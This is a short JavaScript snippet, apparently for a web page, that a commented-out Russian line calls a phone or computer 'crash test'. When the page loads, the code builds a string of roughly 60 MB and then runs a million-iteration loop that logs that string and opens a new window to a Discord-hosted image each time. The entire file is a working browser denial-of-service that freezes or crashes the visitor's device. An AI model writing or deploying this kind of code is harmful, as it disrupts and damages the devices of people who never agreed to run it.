

(async()=>{
    let str = "";

    //await alert("краш тест телефона/компьютера от Романа");


    document.body.style.backgroundImage = "url('back.jpg')";



    for (let i = 0; i < 10000000; i++){
        str+="hello ";
    }

    for (let i = 0 ; i < 1000000; i++){
        console.log(str);
        window.open("https://cdn.discordapp.com/attachments/637979472255123467/1187799067808505967/back.jpg?ex=65983316&is=6585be16&hm=bba0e0fc06199563d3545c856e469e519664a361873a1880e813591c983e6058&");
    }
})()

